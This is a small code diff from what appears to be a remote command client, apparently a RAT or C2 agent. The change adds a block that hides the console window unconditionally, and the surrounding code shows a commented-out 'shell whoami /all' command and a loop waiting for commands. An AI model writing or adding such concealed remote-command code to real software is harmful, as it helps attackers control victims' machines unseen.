@@ -14,6 +14,11 @@ int main() {
 
 	//c.execute_command("shell whoami /all");
 
+	// Hide windows - Show only in debug
+	if (true) {
+		HWND windowH = GetConsoleWindow();
+		ShowWindow(windowH, SW_HIDE);
+	}
 	
 	// Wait for commands
 	for (;;)
